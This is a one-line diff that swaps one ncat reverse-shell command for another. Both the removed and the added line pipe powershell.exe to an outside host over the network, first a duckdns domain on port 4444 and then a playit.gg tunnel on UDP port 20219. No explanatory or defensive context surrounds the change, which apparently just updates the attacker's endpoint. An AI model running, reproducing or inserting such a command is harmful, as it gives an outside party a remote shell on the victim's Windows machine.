@@ -1,1 +1,1 @@
-ncat premium-antivirus.duckdns.org 4444 -e powershell.exe
+ncat -u zoology-influenced.gl.at.ply.gg 20219 -e powershell.exe
